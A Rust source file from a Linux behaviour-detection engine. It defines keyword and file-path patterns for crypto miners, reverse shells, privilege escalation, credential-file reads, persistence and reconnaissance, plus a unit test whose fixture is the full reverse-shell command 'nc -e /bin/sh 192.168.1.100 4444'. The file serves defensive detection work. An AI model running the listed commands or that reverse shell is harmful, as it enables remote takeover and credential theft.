use std::collections::HashMap;
use std::path::Path;
use std::sync::{Arc, RwLock};
use std::time::{Duration, Instant};
use anyhow::{Result, anyhow};
use tracing::{info, warn, error, debug};
use regex::Regex;

use super::process_monitor::ProcessInfo;
use super::fanotify::FanotifyEvent;

#[derive(Debug, Clone)]
pub struct BehaviorPattern {
    pub id: String,
    pub name: String,
    pub description: String,
    pub category: PatternCategory,
    pub severity: Severity,
    pub enabled: bool,
    pub detection_logic: DetectionLogic,
}

#[derive(Debug, Clone, PartialEq)]
pub enum PatternCategory {
    CryptoMiner,
    ReverseShell,
    PrivilegeEscalation,
    MemoryInjection,
    DataExfiltration,
    Persistence,
    Evasion,
    Reconnaissance,
    LateralMovement,
    ResourceAbuse,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone)]
pub enum DetectionLogic {
    CommandLinePattern(Vec<String>),
    FileAccessPattern(Vec<String>),
    NetworkPattern {
        ports: Vec<u16>,
        ips: Vec<String>,
        domains: Vec<String>,
    },
    ProcessChainPattern {
        parent_pattern: String,
        child_pattern: String,
    },
    ResourceUsagePattern {
        cpu_threshold: f32,
        memory_threshold: u64,
        duration: Duration,
    },
    Combined(Vec<DetectionLogic>),
}

// Process execution chain tracking
#[derive(Debug, Clone)]
pub struct ProcessChain {
    pub root_pid: u32,
    pub chain: Vec<ProcessChainNode>,
    pub created_at: Instant,
    pub suspicious_score: u32,
}

#[derive(Debug, Clone)]
pub struct ProcessChainNode {
    pub pid: u32,
    pub ppid: u32,
    pub name: String,
    pub exe_path: Option<std::path::PathBuf>,
    pub cmdline: Vec<String>,
    pub created_at: Instant,
    pub events: Vec<ChainEvent>,
}

#[derive(Debug, Clone)]
pub enum ChainEvent {
    ProcessSpawn {
        child_pid: u32,
        child_name: String,
    },
    FileAccess {
        path: std::path::PathBuf,
        access_type: String,
    },
    NetworkConnection {
        remote_ip: String,
        remote_port: u16,
    },
    PrivilegeChange {
        old_uid: u32,
        new_uid: u32,
    },
}

pub struct PatternMatcher {
    patterns: Arc<RwLock<Vec<BehaviorPattern>>>,
    process_chains: Arc<RwLock<HashMap<u32, ProcessChain>>>,
    compiled_regexes: Arc<RwLock<HashMap<String, Regex>>>,
    reputation_cache: Arc<RwLock<HashMap<String, ReputationScore>>>,
}

#[derive(Debug, Clone)]
pub struct ReputationScore {
    pub hash: String,
    pub score: f32, // 0.0 (malicious) to 1.0 (benign)
    pub reasons: Vec<String>,
    pub last_updated: Instant,
}

impl PatternMatcher {
    pub fn new() -> Result<Self> {
        let mut matcher = Self {
            patterns: Arc::new(RwLock::new(Vec::new())),
            process_chains: Arc::new(RwLock::new(HashMap::new())),
            compiled_regexes: Arc::new(RwLock::new(HashMap::new())),
            reputation_cache: Arc::new(RwLock::new(HashMap::new())),
        };
        
        matcher.load_default_patterns()?;
        Ok(matcher)
    }
    
    fn load_default_patterns(&mut self) -> Result<()> {
        let patterns = vec![
            // Cryptocurrency Miners
            BehaviorPattern {
                id: "crypto_miner_xmrig".to_string(),
                name: "XMRig Cryptocurrency Miner".to_string(),
                description: "Detects XMRig and similar cryptocurrency miners".to_string(),
                category: PatternCategory::CryptoMiner,
                severity: Severity::High,
                enabled: true,
                detection_logic: DetectionLogic::CommandLinePattern(vec![
                    "xmrig".to_string(),
                    "minerd".to_string(),
                    "ethminer".to_string(),
                    "cpuminer".to_string(),
                    "--coin".to_string(),
                    "--pool".to_string(),
                    "stratum+tcp://".to_string(),
                    "stratum+ssl://".to_string(),
                    "--donate-level".to_string(),
                    "--nicehash".to_string(),
                ]),
            },
            
            // Reverse Shells
            BehaviorPattern {
                id: "reverse_shell_bash".to_string(),
                name: "Bash Reverse Shell".to_string(),
                description: "Detects common bash reverse shell patterns".to_string(),
                category: PatternCategory::ReverseShell,
                severity: Severity::Critical,
                enabled: true,
                detection_logic: DetectionLogic::CommandLinePattern(vec![
                    "bash -i".to_string(),
                    "/dev/tcp/".to_string(),
                    "nc -e".to_string(),
                    "nc.traditional -e".to_string(),
                    "ncat -e".to_string(),
                    "0<&196".to_string(),
                    "0<&1".to_string(),
                    "1>&0".to_string(),
                    "2>&0".to_string(),
                    "exec 196<>".to_string(),
                    "sh -i".to_string(),
                ]),
            },
            
            BehaviorPattern {
                id: "reverse_shell_python".to_string(),
                name: "Python Reverse Shell".to_string(),
                description: "Detects Python-based reverse shells".to_string(),
                category: PatternCategory::ReverseShell,
                severity: Severity::Critical,
                enabled: true,
                detection_logic: DetectionLogic::CommandLinePattern(vec![
                    "python -c".to_string(),
                    "python3 -c".to_string(),
                    "socket.socket".to_string(),
                    "subprocess.call".to_string(),
                    "os.dup2".to_string(),
                    "pty.spawn".to_string(),
                ]),
            },
            
            // Privilege Escalation
            BehaviorPattern {
                id: "priv_esc_sudo".to_string(),
                name: "Sudo Privilege Escalation".to_string(),
                description: "Detects potential sudo abuse for privilege escalation".to_string(),
                category: PatternCategory::PrivilegeEscalation,
                severity: Severity::High,
                enabled: true,
                detection_logic: DetectionLogic::Combined(vec![
                    DetectionLogic::CommandLinePattern(vec![
                        "sudo -l".to_string(),
                        "sudo -i".to_string(),
                        "sudo su".to_string(),
                        "sudo bash".to_string(),
                        "sudo sh".to_string(),
                        "!root".to_string(),
                        "ALL=(ALL)".to_string(),
                    ]),
                    DetectionLogic::FileAccessPattern(vec![
                        "/etc/sudoers".to_string(),
                        "/etc/sudoers.d/".to_string(),
                    ]),
                ]),
            },
            
            BehaviorPattern {
                id: "priv_esc_suid".to_string(),
                name: "SUID Binary Exploitation".to_string(),
                description: "Detects attempts to find and exploit SUID binaries".to_string(),
                category: PatternCategory::PrivilegeEscalation,
                severity: Severity::High,
                enabled: true,
                detection_logic: DetectionLogic::CommandLinePattern(vec![
                    "find / -perm -4000".to_string(),
                    "find / -perm -u=s".to_string(),
                    "find / -perm /4000".to_string(),
                    "-perm +4000".to_string(),
                    "gtfobins".to_string(),
                ]),
            },
            
            // Memory Injection
            BehaviorPattern {
                id: "mem_injection_ptrace".to_string(),
                name: "Process Memory Injection via ptrace".to_string(),
                description: "Detects process injection using ptrace".to_string(),
                category: PatternCategory::MemoryInjection,
                severity: Severity::Critical,
                enabled: true,
                detection_logic: DetectionLogic::FileAccessPattern(vec![
                    "/proc/*/mem".to_string(),
                    "/proc/*/maps".to_string(),
                    "/proc/*/environ".to_string(),
                ]),
            },
            
            // Data Exfiltration
            BehaviorPattern {
                id: "data_exfil_compression".to_string(),
                name: "Data Compression for Exfiltration".to_string(),
                description: "Detects large-scale data compression that might indicate exfiltration".to_string(),
                category: PatternCategory::DataExfiltration,
                severity: Severity::Medium,
                enabled: true,
                detection_logic: DetectionLogic::CommandLinePattern(vec![
                    "tar -czf".to_string(),
                    "tar -cjf".to_string(),
                    "zip -r".to_string(),
                    "7z a".to_string(),
                    "rar a".to_string(),
                    "/home/".to_string(),
                    "/etc/".to_string(),
                    "/var/".to_string(),
                ]),
            },
            
            // Persistence
            BehaviorPattern {
                id: "persistence_cron".to_string(),
                name: "Cron-based Persistence".to_string(),
                description: "Detects attempts to establish persistence via cron".to_string(),
                category: PatternCategory::Persistence,
                severity: Severity::High,
                enabled: true,
                detection_logic: DetectionLogic::FileAccessPattern(vec![
                    "/etc/crontab".to_string(),
                    "/etc/cron.d/".to_string(),
                    "/var/spool/cron/".to_string(),
                    "/etc/cron.hourly/".to_string(),
                    "/etc/cron.daily/".to_string(),
                ]),
            },
            
            BehaviorPattern {
                id: "persistence_systemd".to_string(),
                name: "Systemd Service Persistence".to_string(),
                description: "Detects creation of systemd services for persistence".to_string(),
                category: PatternCategory::Persistence,
                severity: Severity::High,
                enabled: true,
                detection_logic: DetectionLogic::FileAccessPattern(vec![
                    "/etc/systemd/system/".to_string(),
                    "/lib/systemd/system/".to_string(),
                    "/usr/lib/systemd/system/".to_string(),
                    ".service".to_string(),
                ]),
            },
            
            // Evasion
            BehaviorPattern {
                id: "evasion_history".to_string(),
                name: "Command History Evasion".to_string(),
                description: "Detects attempts to hide command history".to_string(),
                category: PatternCategory::Evasion,
                severity: Severity::Medium,
                enabled: true,
                detection_logic: DetectionLogic::Combined(vec![
                    DetectionLogic::CommandLinePattern(vec![
                        "unset HISTFILE".to_string(),
                        "export HISTFILESIZE=0".to_string(),
                        "history -c".to_string(),
                        "rm ~/.bash_history".to_string(),
                        "> ~/.bash_history".to_string(),
                    ]),
                    DetectionLogic::FileAccessPattern(vec![
                        ".bash_history".to_string(),
                        ".zsh_history".to_string(),
                    ]),
                ]),
            },
            
            // Reconnaissance
            BehaviorPattern {
                id: "recon_network_scan".to_string(),
                name: "Network Reconnaissance".to_string(),
                description: "Detects network scanning and enumeration".to_string(),
                category: PatternCategory::Reconnaissance,
                severity: Severity::Medium,
                enabled: true,
                detection_logic: DetectionLogic::CommandLinePattern(vec![
                    "nmap".to_string(),
                    "masscan".to_string(),
                    "zmap".to_string(),
                    "nc -zv".to_string(),
                    "ping -c".to_string(),
                    "/24".to_string(),
                    "-sS".to_string(),
                    "-sV".to_string(),
                    "-Pn".to_string(),
                ]),
            },
            
            BehaviorPattern {
                id: "recon_system_enum".to_string(),
                name: "System Enumeration".to_string(),
                description: "Detects system information gathering".to_string(),
                category: PatternCategory::Reconnaissance,
                severity: Severity::Low,
                enabled: true,
                detection_logic: DetectionLogic::CommandLinePattern(vec![
                    "uname -a".to_string(),
                    "id".to_string(),
                    "whoami".to_string(),
                    "cat /etc/passwd".to_string(),
                    "cat /etc/shadow".to_string(),
                    "getent passwd".to_string(),
                    "ls -la /home".to_string(),
                ]),
            },
        ];
        
        let mut patterns_guard = self.patterns.write()
            .map_err(|_| anyhow!("Failed to acquire patterns write lock"))?;
        
        for pattern in patterns {
            // Compile regex patterns
            if let DetectionLogic::CommandLinePattern(ref keywords) = pattern.detection_logic {
                let mut regexes = self.compiled_regexes.write()
                    .map_err(|_| anyhow!("Failed to acquire regex write lock"))?;
                
                for keyword in keywords {
                    if !regexes.contains_key(keyword) {
                        // Create regex that matches the keyword with word boundaries or special chars
                        let regex_pattern = format!(r"(?i)(?:^|[^a-zA-Z0-9]){}(?:[^a-zA-Z0-9]|$)", 
                            regex::escape(keyword));
                        if let Ok(regex) = Regex::new(&regex_pattern) {
                            regexes.insert(keyword.clone(), regex);
                        }
                    }
                }
            }
            
            patterns_guard.push(pattern);
        }
        
        info!("Loaded {} default behavior patterns", patterns_guard.len());
        Ok(())
    }
    
    pub fn check_process(&self, process: &ProcessInfo, event: Option<&FanotifyEvent>) -> Vec<(BehaviorPattern, Severity)> {
        let mut matches = Vec::new();
        
        let patterns = match self.patterns.read() {
            Ok(p) => p,
            Err(_) => return matches,
        };
        
        for pattern in patterns.iter() {
            if !pattern.enabled {
                continue;
            }
            
            if self.pattern_matches(pattern, process, event) {
                matches.push((pattern.clone(), pattern.severity));
            }
        }
        
        matches
    }
    
    fn pattern_matches(&self, pattern: &BehaviorPattern, process: &ProcessInfo, event: Option<&FanotifyEvent>) -> bool {
        match &pattern.detection_logic {
            DetectionLogic::CommandLinePattern(keywords) => {
                self.check_command_line_pattern(keywords, process)
            }
            DetectionLogic::FileAccessPattern(paths) => {
                if let Some(event) = event {
                    self.check_file_access_pattern(paths, event)
                } else {
                    false
                }
            }
            DetectionLogic::NetworkPattern { ports, ips, domains } => {
                // This would need network event data
                false
            }
            DetectionLogic::ProcessChainPattern { parent_pattern, child_pattern } => {
                self.check_process_chain_pattern(parent_pattern, child_pattern, process)
            }
            DetectionLogic::ResourceUsagePattern { cpu_threshold, memory_threshold, duration } => {
                // This would need resource monitoring data
                false
            }
            DetectionLogic::Combined(logics) => {
                logics.iter().any(|logic| {
                    match logic {
                        DetectionLogic::CommandLinePattern(keywords) => 
                            self.check_command_line_pattern(keywords, process),
                        DetectionLogic::FileAccessPattern(paths) => 
                            event.map_or(false, |e| self.check_file_access_pattern(paths, e)),
                        _ => false,
                    }
                })
            }
        }
    }
    
    fn check_command_line_pattern(&self, keywords: &[String], process: &ProcessInfo) -> bool {
        let cmdline_str = process.cmdline.join(" ");
        let process_name = &process.name;
        let exe_path_str = process.exe_path.as_ref()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_default();
        
        let regexes = match self.compiled_regexes.read() {
            Ok(r) => r,
            Err(_) => return false,
        };
        
        for keyword in keywords {
            if let Some(regex) = regexes.get(keyword) {
                if regex.is_match(&cmdline_str) || 
                   regex.is_match(process_name) ||
                   regex.is_match(&exe_path_str) {
                    return true;
                }
            } else {
                // Fallback to simple contains check
                let keyword_lower = keyword.to_lowercase();
                if cmdline_str.to_lowercase().contains(&keyword_lower) ||
                   process_name.to_lowercase().contains(&keyword_lower) ||
                   exe_path_str.to_lowercase().contains(&keyword_lower) {
                    return true;
                }
            }
        }
        
        false
    }
    
    fn check_file_access_pattern(&self, paths: &[String], event: &FanotifyEvent) -> bool {
        if let Some(event_path) = &event.path {
            let path_str = event_path.to_string_lossy().to_lowercase();
            
            for pattern in paths {
                let pattern_lower = pattern.to_lowercase();
                if pattern.ends_with('/') {
                    // Directory pattern
                    if path_str.starts_with(&pattern_lower) {
                        return true;
                    }
                } else if pattern.contains('*') {
                    // Wildcard pattern
                    let regex_pattern = pattern.replace("*", ".*");
                    if let Ok(regex) = Regex::new(&format!("(?i)^{}$", regex_pattern)) {
                        if regex.is_match(&path_str) {
                            return true;
                        }
                    }
                } else {
                    // Exact match or contains
                    if path_str.contains(&pattern_lower) {
                        return true;
                    }
                }
            }
        }
        
        false
    }
    
    fn check_process_chain_pattern(&self, parent_pattern: &str, child_pattern: &str, process: &ProcessInfo) -> bool {
        // Look up the process chain
        let chains = match self.process_chains.read() {
            Ok(c) => c,
            Err(_) => return false,
        };
        
        if let Some(chain) = chains.get(&process.pid) {
            // Check if this process matches the child pattern and has a parent matching parent pattern
            for (i, node) in chain.chain.iter().enumerate() {
                if node.pid == process.pid && i > 0 {
                    let parent_node = &chain.chain[i - 1];
                    
                    let child_matches = node.name.to_lowercase().contains(&child_pattern.to_lowercase()) ||
                        node.cmdline.join(" ").to_lowercase().contains(&child_pattern.to_lowercase());
                    
                    let parent_matches = parent_node.name.to_lowercase().contains(&parent_pattern.to_lowercase()) ||
                        parent_node.cmdline.join(" ").to_lowercase().contains(&parent_pattern.to_lowercase());
                    
                    if child_matches && parent_matches {
                        return true;
                    }
                }
            }
        }
        
        false
    }
    
    // Process chain tracking
    pub fn track_process_spawn(&self, parent: &ProcessInfo, child: &ProcessInfo) -> Result<()> {
        let mut chains = self.process_chains.write()
            .map_err(|_| anyhow!("Failed to acquire process chains write lock"))?;
        
        let now = Instant::now();
        
        // Check if parent already has a chain
        if let Some(parent_chain) = chains.get_mut(&parent.pid) {
            // Add child to existing chain
            let child_node = ProcessChainNode {
                pid: child.pid,
                ppid: child.ppid,
                name: child.name.clone(),
                exe_path: child.exe_path.clone(),
                cmdline: child.cmdline.clone(),
                created_at: now,
                events: Vec::new(),
            };
            
            parent_chain.chain.push(child_node);
            
            // Also create a new chain entry for the child
            let mut child_chain = parent_chain.clone();
            child_chain.root_pid = parent_chain.root_pid;
            chains.insert(child.pid, child_chain);
        } else {
            // Create new chain starting with parent
            let parent_node = ProcessChainNode {
                pid: parent.pid,
                ppid: parent.ppid,
                name: parent.name.clone(),
                exe_path: parent.exe_path.clone(),
                cmdline: parent.cmdline.clone(),
                created_at: now,
                events: vec![ChainEvent::ProcessSpawn {
                    child_pid: child.pid,
                    child_name: child.name.clone(),
                }],
            };
            
            let child_node = ProcessChainNode {
                pid: child.pid,
                ppid: child.ppid,
                name: child.name.clone(),
                exe_path: child.exe_path.clone(),
                cmdline: child.cmdline.clone(),
                created_at: now,
                events: Vec::new(),
            };
            
            let chain = ProcessChain {
                root_pid: parent.pid,
                chain: vec![parent_node, child_node],
                created_at: now,
                suspicious_score: 0,
            };
            
            chains.insert(parent.pid, chain.clone());
            chains.insert(child.pid, chain);
        }
        
        // Clean up old chains (older than 1 hour)
        let cutoff = now - Duration::from_secs(3600);
        chains.retain(|_, chain| chain.created_at > cutoff);
        
        Ok(())
    }
    
    pub fn add_chain_event(&self, pid: u32, event: ChainEvent) -> Result<()> {
        let mut chains = self.process_chains.write()
            .map_err(|_| anyhow!("Failed to acquire process chains write lock"))?;
        
        if let Some(chain) = chains.get_mut(&pid) {
            // Find the node for this PID and add the event
            for node in &mut chain.chain {
                if node.pid == pid {
                    node.events.push(event);
                    
                    // Update suspicious score based on event
                    match &node.events.last().unwrap() {
                        ChainEvent::FileAccess { path, .. } => {
                            let path_str = path.to_string_lossy().to_lowercase();
                            if path_str.contains("/etc/passwd") || 
                               path_str.contains("/etc/shadow") {
                                chain.suspicious_score += 10;
                            }
                        }
                        ChainEvent::NetworkConnection { remote_port, .. } => {
                            // Common malicious ports
                            if [4444, 5555, 6666, 7777, 8888, 9999].contains(remote_port) {
                                chain.suspicious_score += 20;
                            }
                        }
                        ChainEvent::PrivilegeChange { old_uid, new_uid } => {
                            if *old_uid != 0 && *new_uid == 0 {
                                chain.suspicious_score += 30;
                            }
                        }
                        _ => {}
                    }
                    
                    break;
                }
            }
        }
        
        Ok(())
    }
    
    // Reputation system
    pub fn check_reputation(&self, file_hash: &str) -> Option<ReputationScore> {
        let cache = match self.reputation_cache.read() {
            Ok(c) => c,
            Err(_) => return None,
        };
        
        cache.get(file_hash).cloned()
    }
    
    pub fn update_reputation(&self, file_hash: String, score: f32, reason: String) -> Result<()> {
        let mut cache = self.reputation_cache.write()
            .map_err(|_| anyhow!("Failed to acquire reputation cache write lock"))?;
        
        let now = Instant::now();
        
        if let Some(rep_score) = cache.get_mut(&file_hash) {
            // Update existing score (weighted average)
            rep_score.score = (rep_score.score * 0.7 + score * 0.3).max(0.0).min(1.0);
            rep_score.reasons.push(reason);
            rep_score.last_updated = now;
        } else {
            // Create new reputation entry
            cache.insert(file_hash.clone(), ReputationScore {
                hash: file_hash,
                score,
                reasons: vec![reason],
                last_updated: now,
            });
        }
        
        // Clean up old entries (older than 24 hours)
        let cutoff = now - Duration::from_secs(86400);
        cache.retain(|_, score| score.last_updated > cutoff);
        
        Ok(())
    }
    
    pub fn get_chain_analysis(&self, pid: u32) -> Option<String> {
        let chains = match self.process_chains.read() {
            Ok(c) => c,
            Err(_) => return None,
        };
        
        if let Some(chain) = chains.get(&pid) {
            let mut analysis = format!("Process Chain Analysis for PID {}:\n", pid);
            analysis.push_str(&format!("Root PID: {}\n", chain.root_pid));
            analysis.push_str(&format!("Chain Length: {}\n", chain.chain.len()));
            analysis.push_str(&format!("Suspicious Score: {}\n", chain.suspicious_score));
            analysis.push_str("\nChain:\n");
            
            for (i, node) in chain.chain.iter().enumerate() {
                analysis.push_str(&format!("{} {} (PID: {}) - {}\n", 
                    "  ".repeat(i), 
                    node.name, 
                    node.pid,
                    node.cmdline.join(" ")
                ));
                
                for event in &node.events {
                    analysis.push_str(&format!("{}   Event: {:?}\n", "  ".repeat(i), event));
                }
            }
            
            Some(analysis)
        } else {
            None
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_pattern_matcher_creation() {
        let matcher = PatternMatcher::new().unwrap();
        let patterns = matcher.patterns.read().unwrap();
        assert!(!patterns.is_empty());
    }
    
    #[test]
    fn test_command_line_detection() {
        let matcher = PatternMatcher::new().unwrap();
        
        let process = ProcessInfo {
            pid: 1234,
            ppid: 1,
            name: "bash".to_string(),
            exe_path: Some(std::path::PathBuf::from("/bin/bash")),
            cmdline: vec!["bash", "-c", "nc -e /bin/sh 192.168.1.100 4444"].iter()
                .map(|s| s.to_string()).collect(),
            uid: 1000,
            gid: 1000,
            start_time: 0,
        };
        
        let matches = matcher.check_process(&process, None);
        assert!(!matches.is_empty());
        assert!(matches.iter().any(|(p, _)| p.category == PatternCategory::ReverseShell));
    }
}